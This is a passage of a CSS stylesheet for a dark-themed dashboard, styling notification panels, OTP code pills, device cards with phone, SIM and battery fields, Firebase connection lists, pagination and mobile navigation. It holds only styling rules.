    box-shadow:
      0 24px 60px rgba(0, 0, 0, 0.5),
      inset 0 1px 0 rgba(255, 255, 255, 0.1);
    overflow: hidden;
  }
  .np-header {
    display: flex;
    align-items: center;
    gap: 6px;
    padding: 11px 14px 10px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.07);
  }
  .np-title {
    font-size: 13px;
    font-weight: 700;
    color: #e2e8f0;
    flex: 1;
  }
  .np-badge {
    font-size: 10px;
    font-weight: 800;
    padding: 2px 7px;
    border-radius: 20px;
    background: #f97316;
    color: #fff;
    font-family: "JetBrains Mono", monospace;
  }
  .np-header-actions {
    display: flex;
    align-items: center;
    gap: 4px;
  }
  .np-icon-btn {
    width: 26px;
    height: 26px;
    border-radius: 7px;
    border: none;
    padding: 0;
    background: rgba(255, 255, 255, 0.07);
    color: rgba(255, 255, 255, 0.5);
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 140ms;
  }
  .np-icon-btn:hover {
    background: rgba(255, 255, 255, 0.14);
    color: #fff;
  }
  .np-icon-btn:active {
    transform: scale(0.9);
  }
  .np-trash:hover {
    background: rgba(239, 68, 68, 0.25) !important;
    color: #ef4444 !important;
  }

  /* Cards scroll area */
  .np-cards {
    display: flex;
    flex-direction: column;
    max-height: 60vh;
    overflow-y: auto;
    scrollbar-width: none;
  }
  .np-cards::-webkit-scrollbar {
    display: none;
  }
  .np-expanded {
    max-height: 70vh;
  }

  .np-card {
    padding: 10px 13px 6px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    position: relative;
    overflow: hidden;
    animation: np-in 0.28s cubic-bezier(0.34, 1.4, 0.64, 1) both;
  }
  .np-leaving {
    animation: np-out 0.22s ease forwards;
  }
  .np-card:last-child {
    border-bottom: none;
  }

  /* Card top row */
  .np-card-top {
    display: flex;
    align-items: center;
    gap: 7px;
    margin-bottom: 4px;
  }
  .np-app-ico {
    width: 30px;
    height: 30px;
    border-radius: 8px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 13px;
    font-weight: 800;
  }
  .np-card-title-col {
    display: flex;
    align-items: center;
    gap: 5px;
    flex: 1;
    min-width: 0;
  }
  .np-service {
    font-size: 12px;
    font-weight: 700;
    color: #e2e8f0;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .np-type-badge {
    font-size: 8px;
    font-weight: 800;
    padding: 1px 5px;
    border-radius: 4px;
    background: rgba(52, 211, 153, 0.15);
    color: #34d399;
    border: 1px solid rgba(52, 211, 153, 0.3);
    flex-shrink: 0;
  }
  .np-time {
    font-size: 9.5px;
    color: rgba(255, 255, 255, 0.4);
    font-family: "JetBrains Mono", monospace;
    flex-shrink: 0;
  }
  .np-dismiss {
    width: 18px;
    height: 18px;
    border-radius: 50%;
    border: none;
    padding: 0;
    background: rgba(255, 255, 255, 0.07);
    color: rgba(255, 255, 255, 0.4);
    cursor: pointer;
    font-size: 14px;
    line-height: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    font-family: inherit;
    transition: all 140ms;
  }
  .np-dismiss:hover {
    background: rgba(239, 68, 68, 0.3);
    color: #fff;
  }

  /* Message preview */
  .np-msg {
    font-size: 10.5px;
    color: rgba(255, 255, 255, 0.55);
    margin-bottom: 6px;
    line-height: 1.35;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }

  /* OTP row */
  .np-otp-row {
    display: flex;
    align-items: center;
    gap: 5px;
    background: rgba(6, 78, 59, 0.45);
    border: 1px solid rgba(52, 211, 153, 0.3);
    border-radius: 10px;
    padding: 5px 8px;
    margin-bottom: 4px;
  }
  .np-otp-lock {
    color: rgba(52, 211, 153, 0.6);
    flex-shrink: 0;
    display: flex;
    align-items: center;
  }
  .np-otp-masked {
    font-family: "JetBrains Mono", monospace;
    font-size: 15px;
    font-weight: 900;
    color: #4ade80;
    letter-spacing: 0.1em;
    flex: 1;
    text-shadow: 0 0 10px rgba(74, 222, 128, 0.3);
  }
  /* Square icon buttons */
  .np-icon-sq {
    width: 26px;
    height: 26px;
    border-radius: 7px;
    border: none;
    padding: 0;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    transition: all 130ms;
  }
  .np-icon-sq:active {
    transform: scale(0.9);
  }
  .np-otp-copy {
    background: rgba(52, 211, 153, 0.15);
    color: rgba(74, 222, 128, 0.6);
  }
  .np-otp-copy:hover {
    background: rgba(52, 211, 153, 0.3);
    color: #4ade80;
  }
  /* Device ID section */
  .np-dev-sep {
    width: 1px;
    height: 16px;
    background: rgba(255, 255, 255, 0.1);
    flex-shrink: 0;
  }
  .np-dev-ico {
    color: rgba(56, 189, 248, 0.5);
    flex-shrink: 0;
  }
  .np-dev-id {
    font-family: "JetBrains Mono", monospace;
    font-size: 10px;
    color: rgba(56, 189, 248, 0.7);
    flex: 1;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .np-dev-copy {
    background: rgba(56, 189, 248, 0.1);
    color: rgba(56, 189, 248, 0.5);
  }
  .np-dev-copy:hover {
    background: rgba(56, 189, 248, 0.22);
    color: #38bdf8;
  }
  .np-navigate {
    background: rgba(99, 102, 241, 0.15);
    color: rgba(129, 140, 248, 0.6);
  }
  .np-navigate:hover {
    background: rgba(99, 102, 241, 0.28);
    color: #818cf8;
  }

  /* VERIF row */
  .np-verif-row {
    display: flex;
    align-items: center;
    gap: 6px;
    background: rgba(56, 189, 248, 0.07);
    border: 1px solid rgba(56, 189, 248, 0.15);
    border-radius: 8px;
    padding: 5px 8px;
    margin-bottom: 4px;
  }
  .np-verif-badge {
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #38bdf8;
    flex-shrink: 0;
  }
  .np-verif-msg {
    font-size: 10.5px;
    color: rgba(255, 255, 255, 0.6);
    flex: 1;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }

  /* Bottom shimmer bar */
  .np-bar {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 2px;
    opacity: 0.6;
  }

  /* Footer show all */
  .np-footer {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    padding: 10px;
    border-top: 1px solid rgba(255, 255, 255, 0.07);
    background: rgba(255, 255, 255, 0.03);
    color: rgba(255, 255, 255, 0.5);
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    border: none;
    font-family: inherit;
    width: 100%;
    transition: all 140ms;
  }
  .np-footer:hover {
    color: #e2e8f0;
    background: rgba(255, 255, 255, 0.07);
  }

  /* Collapsed bell */
  .np-collapsed-btn {
    position: fixed;
    top: 12px;
    right: 12px;
    z-index: 200;
    width: 42px;
    height: 42px;
    border-radius: 13px;
    background: rgba(10, 14, 26, 0.85);
    border: 1px solid rgba(255, 255, 255, 0.12);
    color: rgba(255, 255, 255, 0.6);
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    -webkit-backdrop-filter: blur(20px);
    backdrop-filter: blur(20px);
    transition: all 140ms;
    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
  }
  .np-collapsed-btn:hover {
    border-color: rgba(249, 115, 22, 0.5);
    color: #f97316;
  }
  .np-collapsed-cnt {
    position: absolute;
    top: -4px;
    right: -4px;
    background: #f97316;
    color: #fff;
    font-size: 9px;
    font-weight: 800;
    min-width: 16px;
    height: 16px;
    border-radius: 8px;
    padding: 0 3px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: "JetBrains Mono", monospace;
  }

  /* Panel animations */
  @keyframes np-in {
    from {
      opacity: 0;
      transform: translateY(-6px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  @keyframes np-out {
    from {
      opacity: 1;
      max-height: 120px;
    }
    to {
      opacity: 0;
      max-height: 0;
      padding: 0;
      margin: 0;
    }
  }

  /* ── Mobile Bottom Navigation Bar ─────────────────────────────────────── */
  .bottom-nav {
    display: none; /* desktop: hidden */
  }

  @media (max-width: 768px) {
    .bottom-nav {
      display: flex;
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      z-index: 300;
      background: rgba(10, 14, 26, 0.92);
      -webkit-backdrop-filter: blur(24px) saturate(180%);
      backdrop-filter: blur(24px) saturate(180%);
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      padding: 0 0 env(safe-area-inset-bottom, 0);
      height: calc(60px + env(safe-area-inset-bottom, 0));
    }
    .bn-item {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 3px;
      padding: 8px 4px;
      border: none;
      background: none;
      color: rgba(255, 255, 255, 0.35);
      cursor: pointer;
      font-family: inherit;
      transition: all 150ms;
      min-height: 48px;
    }
    .bn-item:hover {
      color: rgba(255, 255, 255, 0.6);
    }
    .bn-item.bn-active {
      color: #f97316;
    }
    .bn-label {
      font-size: 10px;
      font-weight: 600;
      letter-spacing: 0.02em;
      line-height: 1;
    }

    /* Push tab body above bottom nav */
    .tab-body {
      padding-bottom: 80px;
    }

    /* Bell panel: full width on mobile, positioned from top */
    .bell-panel {
      top: 58px;
      right: 8px;
      left: 8px;
      width: auto !important;
      height: auto !important;
      border-radius: 18px;
      max-height: calc(100vh - 140px);
    }
    .bp-resize-edge,
    .bp-resize-corner {
      display: none !important;
    }

    /* Smaller device cards on mobile */
    .dev-card {
      padding: 9px 10px;
      min-height: 52px;
    }
    .dev-card-id {
      font-size: 11.5px;
    }
    .dev-card-grid {
      grid-template-columns: 1fr;
      gap: 6px;
      padding: 6px;
    }
  }

  @keyframes notif-in {
    0% {
      opacity: 0;
      transform: translateX(24px) scale(0.92);
      filter: blur(4px);
    }
    60% {
      opacity: 1;
      filter: blur(0);
    }
    100% {
      opacity: 1;
      transform: translateX(0) scale(1);
      filter: blur(0);
    }
  }
  @keyframes notif-out {
    0% {
      opacity: 1;
      transform: scale(1) translateX(0);
      max-height: 200px;
    }
    100% {
      opacity: 0;
      transform: scale(0.9) translateX(16px);
      max-height: 0;
      margin: 0;
      padding: 0;
    }
  }
  /* ── Bell notification badge ─────────────────────────────────────────── */
  .bell-wrap {
    position: relative;
    display: inline-flex;
  }
  .notif-badge {
    position: absolute;
    top: -5px;
    right: -5px;
    min-width: 17px;
    height: 17px;
    border-radius: 9px;
    background: #ef4444;
    color: #fff;
    font-size: 9px;
    font-weight: 800;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 0 3px;
    pointer-events: none;
    border: 2px solid #0b0e17;
    animation: badge-pop 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) both;
  }
  @keyframes badge-pop {
    from {
      transform: scale(0);
    }
    to {
      transform: scale(1);
    }
  }

  /* ── Bell backdrop ──────────────────────────────────────────────────────── */
  .bell-backdrop {
    position: fixed;
    inset: 0;
    z-index: 290;
    background: rgba(0, 0, 0, 0.15);
  }

  /* ── Bell floating panel ─────────────────────────────────────────────────── */
  .bell-panel {
    position: fixed;
    top: 52px;
    right: 12px;
    z-index: 300;
    width: 360px;
    min-width: 300px;
    max-width: calc(100vw - 24px);
    max-height: calc(100vh - 80px);
    display: flex;
    flex-direction: column;
    background: rgba(11, 16, 30, 0.96);
    -webkit-backdrop-filter: blur(40px) saturate(200%);
    backdrop-filter: blur(40px) saturate(200%);
    border: 1px solid rgba(255, 255, 255, 0.12);
    border-top-color: rgba(255, 255, 255, 0.2);
    border-radius: 20px;
    box-shadow:
      0 20px 60px rgba(0, 0, 0, 0.5),
      inset 0 1px 0 rgba(255, 255, 255, 0.12);
    overflow: hidden;
    animation: panel-drop 0.28s cubic-bezier(0.34, 1.3, 0.64, 1) both;
  }
  .bp-resizing {
    user-select: none !important;
    transition: none !important;
  }
  .bp-dragging {
    user-select: none !important;
    transition: none !important;
  }

  /* Large screen edge & corner resize handles */
  .bp-resize-edge {
    position: absolute;
    z-index: 20;
  }
  .bp-resize-left {
    top: 0;
    bottom: 14px;
    left: 0;
    width: 8px;
    cursor: ew-resize;
    transition: background 150ms;
  }
  .bp-resize-left:hover,
  .bp-resizing .bp-resize-left {
    background: rgba(249, 115, 22, 0.35);
  }
  .bp-resize-bottom {
    left: 14px;
    right: 14px;
    bottom: 0;
    height: 8px;
    cursor: ns-resize;
    transition: background 150ms;
  }
  .bp-resize-bottom:hover,
  .bp-resizing .bp-resize-bottom {
    background: rgba(249, 115, 22, 0.35);
  }
  .bp-resize-corner {
    position: absolute;
    width: 18px;
    height: 18px;
    z-index: 25;
  }
  .bp-resize-bl {
    bottom: 0;
    left: 0;
    cursor: nesw-resize;
    border-bottom-left-radius: 20px;
    transition: background 150ms;
  }
  .bp-resize-bl:hover,
  .bp-resizing .bp-resize-bl {
    background: rgba(249, 115, 22, 0.35);
  }
  .bp-resize-br {
    bottom: 0;
    right: 0;
    cursor: nwse-resize;
    display: flex;
    align-items: flex-end;
    justify-content: flex-end;
    padding: 3px;
    border-bottom-right-radius: 20px;
    color: rgba(255, 255, 255, 0.3);
    transition: color 150ms, background 150ms;
  }
  .bp-resize-br:hover,
  .bp-resizing .bp-resize-br {
    color: #f97316;
    background: rgba(249, 115, 22, 0.2);
  }
  .bp-grip-icon {
    display: block;
    pointer-events: none;
  }

  @keyframes panel-drop {
    from {
      opacity: 0;
      transform: translateY(-10px) scale(0.97);
    }
    to {
      opacity: 1;
      transform: translateY(0) scale(1);
    }
  }

  /* Panel header */
  .bp-hdr {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 12px 14px 10px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
    flex-shrink: 0;
  }
  .bp-title {
    font-size: 13px;
    font-weight: 700;
    color: #e2e8f0;
    flex: 1;
  }
  .bp-cnt {
    color: #64748b;
    font-weight: 600;
  }
  .bp-actions {
    display: flex;
    align-items: center;
    gap: 4px;
    position: relative;
    z-index: 10;
  }
  .bp-icon-btn {
    width: 28px;
    height: 28px;
    border-radius: 8px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    background: rgba(255, 255, 255, 0.04);
    color: #64748b;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 140ms;
    font-family: inherit;
    flex-shrink: 0;
  }
  .bp-icon-btn:hover {
    color: #e2e8f0;
    border-color: rgba(255, 255, 255, 0.2);
    background: rgba(255, 255, 255, 0.08);
  }
  .bp-clear-btn:hover {
    color: #ef4444 !important;
    border-color: rgba(239, 68, 68, 0.35) !important;
    background: rgba(239, 68, 68, 0.1) !important;
  }
  .bp-close-btn:hover {
    color: #ef4444 !important;
    border-color: rgba(239, 68, 68, 0.35) !important;
    background: rgba(239, 68, 68, 0.1) !important;
  }
  .bp-muted {
    color: #ef4444 !important;
    border-color: rgba(239, 68, 68, 0.35) !important;
    background: rgba(239, 68, 68, 0.08) !important;
  }

  /* Panel empty state */
  .bp-empty {
    padding: 28px 16px;
    text-align: center;
    color: #475569;
    font-size: 13px;
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  /* Panel notification list */
  .bp-list {
    overflow-y: auto;
    flex: 1;
    padding: 8px;
    display: flex;
    flex-direction: column;
    gap: 6px;
    scrollbar-width: thin;
    scrollbar-color: rgba(255, 255, 255, 0.08) transparent;
  }
  .bp-list::-webkit-scrollbar {
    width: 3px;
  }
  .bp-list::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 3px;
  }

  /* Notification card inside bell panel */
  .bp-card {
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.09);
    border-radius: 14px;
    padding: 9px 11px;
    display: flex;
    flex-direction: column;
    gap: 7px;
    animation: notif-in 0.25s ease both;
    transition:
      opacity 0.25s,
      transform 0.25s;
  }
  .bp-card.nleave {
    animation: notif-out 0.22s ease forwards;
  }
  .bp-card:hover {
    background: rgba(255, 255, 255, 0.07);
  }

  /* Card top row */
  .bp-card-top {
    display: flex;
    align-items: flex-start;
    gap: 8px;
  }
  .bp-app-icon {
    width: 34px;
    height: 34px;
    border-radius: 9px;
    border: 1px solid;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  .bp-card-mid {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 2px;
  }
  .bp-sender {
    font-size: 12px;
    font-weight: 700;
    color: #e2e8f0;
  }
  .bp-msg-preview {
    font-size: 11px;
    color: #64748b;
    line-height: 1.3;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .bp-time {
    font-size: 10px;
    color: #475569;
    font-family: "JetBrains Mono", monospace;
    flex-shrink: 0;
    white-space: nowrap;
    padding-top: 2px;
  }

  /* Card bottom row */
  .bp-card-bot {
    display: flex;
    align-items: center;
    gap: 5px;
    flex-wrap: wrap;
    position: relative;
  }

  /* OTP pill */
  .bp-otp-pill {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: linear-gradient(
      135deg,
      rgba(52, 211, 153, 0.15),
      rgba(16, 185, 129, 0.05)
    );
    border: 1px solid rgba(52, 211, 153, 0.4);
    border-radius: 10px;
    padding: 5px 10px;
    cursor: pointer;
    font-family: inherit;
    color: #4ade80;
    transition: all 150ms;
    flex-shrink: 0;
  }
  .bp-otp-pill:hover {
    border-color: rgba(52, 211, 153, 0.7);
    background: rgba(52, 211, 153, 0.2);
  }
  .bp-otp-code {
    font-family: "JetBrains Mono", monospace;
    font-size: 15px;
    font-weight: 900;
    color: #4ade80;
    letter-spacing: 0.1em;
  }

  /* Device pill */
  .bp-dev-pill {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.12);
    border-radius: 8px;
    padding: 4px 8px;
    cursor: pointer;
    font-family: inherit;
    color: #94a3b8;
    font-size: 10px;
    transition: all 150ms;
    flex-shrink: 0;
  }
  .bp-dev-pill:hover {
    background: rgba(255, 255, 255, 0.1);
    color: #e2e8f0;
  }

  /* Navigate button */
  .bp-nav-btn {
    margin-left: auto;
    flex-shrink: 0;
    width: 28px;
    height: 28px;
    border-radius: 8px;
    border: 1px solid rgba(249, 115, 22, 0.3);
    background: rgba(249, 115, 22, 0.1);
    color: #f97316;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 150ms;
  }
  .bp-nav-btn:hover {
    background: rgba(249, 115, 22, 0.2);
    border-color: rgba(249, 115, 22, 0.6);
  }

  /* Progress bar at bottom of card */
  .bp-progress {
    position: absolute;
    bottom: -7px;
    left: 0;
    right: 0;
    height: 2px;
    background: linear-gradient(90deg, #22c55e, transparent);
    border-radius: 0 0 10px 10px;
    animation: bp-shrink 30s linear both;
  }
  @keyframes bp-shrink {
    from {
      width: 100%;
    }
    to {
      width: 0%;
    }
  }

  /* Verif chip */
  .bp-verif-chip {
    font-size: 9px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    padding: 3px 7px;
    border-radius: 6px;
    background: rgba(56, 189, 248, 0.1);
    color: #38bdf8;
    border: 1px solid rgba(56, 189, 248, 0.25);
    flex-shrink: 0;
  }
  .bp-verif-text {
    font-size: 11px;
    color: rgba(255, 255, 255, 0.6);
    flex: 1;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }

  /* ── Icon copy button (xs) ────────────────────────────────────────────── */
  .icon-btn-xs {
    background: none;
    border: none;
    color: #475569;
    cursor: pointer;
    padding: 3px;
    border-radius: 4px;
    transition: all 120ms;
    display: inline-flex;
    align-items: center;
    flex-shrink: 0;
  }
  .icon-btn-xs:hover {
    color: #94a3b8;
    background: rgba(255, 255, 255, 0.08);
  }

  /* ── Device card grid (2 columns on desktop/web) ────────────────────────── */
  .dev-card-grid {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 8px;
    padding: 8px;
  }
  .dev-card {
    display: flex;
    align-items: center;
    gap: 10px;
    background: #141b2d;
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 12px;
    padding: 10px 12px;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    transition:
      background 100ms,
      border-color 100ms;
    min-height: 56px;
  }
  .dev-card:hover {
    background: #1a2238;
    border-color: rgba(255, 255, 255, 0.13);
  }
  .dev-card.dev-card-sel {
    background: rgba(249, 115, 22, 0.08);
    border-color: rgba(249, 115, 22, 0.4);
  }
  .dev-card.dev-card-used {
    opacity: 0.45;
  }
  .dev-card.dev-card-used .dev-card-id {
    text-decoration: line-through;
  }
  .dev-card-bar {
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 3px;
    border-radius: 12px 0 0 12px;
  }
  .dev-card-dot {
    flex-shrink: 0;
    margin-left: 4px;
  }
  .dev-card-body {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 2px;
  }
  .dev-card-id-row {
    display: flex;
    align-items: center;
    gap: 5px;
  }
  .dev-card-id {
    font-size: 12px;
    font-weight: 700;
    color: #e2e8f0;
    font-family: "JetBrains Mono", monospace;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .dev-card-sub {
    display: flex;
    align-items: center;
    gap: 5px;
    flex-wrap: wrap;
    min-width: 0;
  }
  .dev-card-phone {
    font-size: 11.5px;
    color: #94a3b8;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    flex: 1;
    min-width: 0;
  }
  .dev-card-no-num {
    font-size: 11px;
    color: #475569;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .dev-card-sim {
    font-size: 10px;
    color: #475569;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 5px;
    padding: 1px 5px;
    flex-shrink: 0;
  }
  .dev-card-right {
    display: flex;
    align-items: center;
    gap: 6px;
    flex-shrink: 0;
  }
  .dev-card-bat {
    font-size: 11px;
    font-weight: 700;
    padding: 2px 6px;
    border-radius: 6px;
    font-family: "JetBrains Mono", monospace;
    flex-shrink: 0;
  }
  .dev-card-arrow {
    color: #334155;
    flex-shrink: 0;
    transition: color 120ms;
  }
  .dev-card:hover .dev-card-arrow {
    color: #64748b;
  }
  .dt-empty {
    padding: 32px;
    text-align: center;
    color: #334155;
    font-size: 13px;
  }

  /* ── Sidebar X close button ──────────────────────────────────────────────── */
  .side-close-btn {
    margin-left: auto;
    background: none;
    border: none;
    cursor: pointer;
    color: #475569;
    padding: 4px;
    border-radius: 6px;
    display: flex;
    align-items: center;
    transition: all 120ms;
  }
  .side-close-btn:hover {
    color: #e2e8f0;
    background: rgba(255, 255, 255, 0.08);
  }

  /* ── Sidebar full-height Firebase scroll ─────────────────────────────────── */
  .side-footer-full {
    flex: 1;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    border-top: 1px solid rgba(255, 255, 255, 0.06);
    padding-top: 6px;
    min-height: 0;
  }
  .conn-scroll-full {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    max-height: none !important;
    scrollbar-width: thin;
    scrollbar-color: rgba(255, 255, 255, 0.08) transparent;
  }
  .conn-scroll-full::-webkit-scrollbar {
    width: 3px;
  }
  .conn-scroll-full::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 3px;
  }
  /* Inline add-Firebase button in header */
  .add-fb-inline {
    margin-left: auto;
    background: rgba(249, 115, 22, 0.12);
    border: 1px solid rgba(249, 115, 22, 0.3);
    border-radius: 6px;
    width: 22px;
    height: 22px;
    cursor: pointer;
    color: #f97316;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 120ms;
    flex-shrink: 0;
  }
  .add-fb-inline:hover {
    background: rgba(249, 115, 22, 0.2);
  }

  /* ── Pagination bar ──────────────────────────────────────────────────────── */

  .pag-btn {
    width: 32px;
    height: 32px;
    border-radius: 8px;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.08);
    color: #64748b;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 120ms;
    font-family: inherit;
  }
  .pag-btn:hover:not(:disabled) {
    background: rgba(255, 255, 255, 0.1);
    color: #e2e8f0;
    border-color: rgba(255, 255, 255, 0.2);
  }
  .pag-btn:disabled {
    opacity: 0.25;
    cursor: default;
  }
  .pag-info {
    font-size: 12px;
    color: #64748b;
    font-weight: 600;
    min-width: 56px;
    text-align: center;
    font-family: "JetBrains Mono", monospace;
  }

  /* ── Dev card grid - single column on mobile ─────────────────────────── */
  /* (defined above at line 2681 — no override needed here) */

  /* ── Dev card layout tweaks for mobile ──────────────────────────────────── */
  .dev-card {
    min-height: 52px;
    padding: 8px 10px;
  }
  .dev-card-id {
    font-size: 11.5px;
  }
  .dev-card-phone {
    font-size: 11px;
  }
  .dev-card-bat {
    font-size: 10px;
    padding: 2px 5px;
  }

  /* ── Settings toggle in add panel ───────────────────────────────────────── */
  .ap-settings {
    margin-top: 14px;
    padding-top: 12px;
    border-top: 1px solid rgba(255, 255, 255, 0.07);
  }
  .aps-title {
    font-size: 10px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.08em;
    color: #475569;
    margin-bottom: 10px;
  }
  .aps-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    cursor: pointer;
  }
  .aps-lbl {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    color: #94a3b8;
    font-weight: 500;
  }
  .aps-tog {
    width: 42px;
    height: 24px;
    border-radius: 12px;
    background: rgba(255, 255, 255, 0.1);
    border: 1px solid rgba(255, 255, 255, 0.12);
    position: relative;
    cursor: pointer;
    transition: all 220ms;
    flex-shrink: 0;
    padding: 0;
  }
  .aps-tog.aps-on {
    background: rgba(34, 197, 94, 0.3);
    border-color: rgba(34, 197, 94, 0.5);
  }
  .aps-knob {
    position: absolute;
    top: 3px;
    left: 3px;
    width: 16px;
    height: 16px;
    border-radius: 50%;
    background: #64748b;
    transition: all 220ms;
    display: block;
  }
  .aps-tog.aps-on .aps-knob {
    transform: translateX(18px);
    background: #22c55e;
  }

  /* ── Bell panel drag handle cursor ──────────────────────────────────────── */
  .bp-drag-handle {
    cursor: grab;
  }
  .bp-drag-handle:active {
    cursor: grabbing;
  }

  /* Reset panel position when re-opened */
  /* (handled via notifPanelPos reset in showBellPanel toggle) */

  /* ── Mobile: smaller text across the board ──────────────────────────────── */
  @media (max-width: 768px) {
    .dev-card-id {
      font-size: 11px;
    }
    .dev-card-phone {
      font-size: 10.5px;
    }
    .dev-card-bat {
      font-size: 9.5px;
      padding: 1px 4px;
    }
    .dt-chip {
      font-size: 10px;
      padding: 4px 8px;
    }
    .dt-chip-cnt {
      font-size: 9px;
    }
    .conn-badge {
      font-size: 10px;
      padding: 3px 8px;
    }
    .sc-n {
      font-size: 24px !important;
    }
    .lc-title {
      font-size: 15px;
    }
    .lc-sub {
      font-size: 11px;
    }
    .pag-info {
      font-size: 11px;
    }
    .pag-btn {
      width: 28px;
      height: 28px;
    }

    /* Notification panel: full width, max height 70vh */
    .bell-panel {
      top: 56px;
      left: 8px;
      right: 8px;
      width: auto !important;
      height: auto !important;
      max-height: 70vh;
      border-radius: 18px;
    }
    .bp-resize-edge,
    .bp-resize-corner {
      display: none !important;
    }
    .bp-sender {
      font-size: 11px;
    }
    .bp-msg-preview {
      font-size: 10px;
    }
    .bp-time {
      font-size: 9px;
    }
    .bp-otp-code {
      font-size: 13px;
    }
  }

  /* ── Sidebar tabs ─────────────────────────────────────────────────────────── */
  .side-online-pill {
    margin-left: auto;
    font-size: 9px;
    font-weight: 800;
    padding: 2px 7px;
    border-radius: 10px;
    background: rgba(34, 197, 94, 0.15);
    color: #22c55e;
    border: 1px solid rgba(34, 197, 94, 0.3);
    white-space: nowrap;
    flex-shrink: 0;
  }
  .side-tabs {
    display: flex;
    gap: 2px;
    padding: 6px 8px 0;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    flex-shrink: 0;
  }
  .side-tab-btn {
    flex: 1;
    padding: 6px 4px;
    border-radius: 6px 6px 0 0;
    font-size: 11px;
    font-weight: 700;
    cursor: pointer;
    border: none;
    background: transparent;
    color: #475569;
    font-family: inherit;
    transition: all 130ms;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 4px;
  }
  .side-tab-btn:hover {
    color: #94a3b8;
  }
  .stab-a {
    color: #f97316 !important;
    border-bottom: 2px solid #f97316;
  }
  .stab-cnt {
    font-size: 9px;
    font-weight: 800;
    background: rgba(255, 255, 255, 0.08);
    padding: 1px 5px;
    border-radius: 8px;
    font-family: "JetBrains Mono", monospace;
  }

  /* ── Sidebar device list ──────────────────────────────────────────────────── */
  .side-dev-search {
    display: flex;
    align-items: center;
    gap: 5px;
    margin: 6px 8px 2px;
    padding: 6px 8px;
    background: rgba(255, 255, 255, 0.04);
    border: 1px solid rgba(255, 255, 255, 0.07);
    border-radius: 7px;
    flex-shrink: 0;
  }
  .side-dev-search-in {
    background: none;
    border: none;
    outline: none;
    font-size: 11.5px;
    color: #e2e8f0;
    width: 100%;
    font-family: inherit;
  }
  .side-dev-search-in::placeholder {
    color: #334155;
  }
  .side-search-clear {
    background: none;
    border: none;
    color: #475569;
    cursor: pointer;
    font-size: 14px;
    line-height: 1;
    padding: 0 2px;
    font-family: inherit;
  }
  .side-dev-pills {
    display: flex;
    gap: 3px;
    padding: 3px 8px 4px;
    flex-shrink: 0;
  }
  .sdp {
    flex: 1;
    padding: 3px 2px;
    border-radius: 5px;
    border: 1px solid rgba(255, 255, 255, 0.07);
    background: transparent;
    color: #475569;
    font-size: 10.5px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    transition: all 120ms;
    display: flex;
    align-items: center;
    justify-content: center;
